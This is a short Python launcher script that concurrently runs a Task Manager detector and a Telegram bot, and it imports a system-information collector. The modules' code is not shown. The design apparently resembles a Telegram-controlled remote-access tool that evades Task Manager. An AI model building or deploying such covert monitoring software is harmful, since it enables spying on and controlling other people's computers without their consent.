import asyncio
from taskmanagerDetector import if_taskmgr_open
from telegrambot import main
from getusersystem import get_system_info


async def mainActivity():
    """работаем со всем асинхронно"""

    await asyncio.gather(
        if_taskmgr_open(),
        main()
    )


if __name__ == '__main__':
    asyncio.run(mainActivity())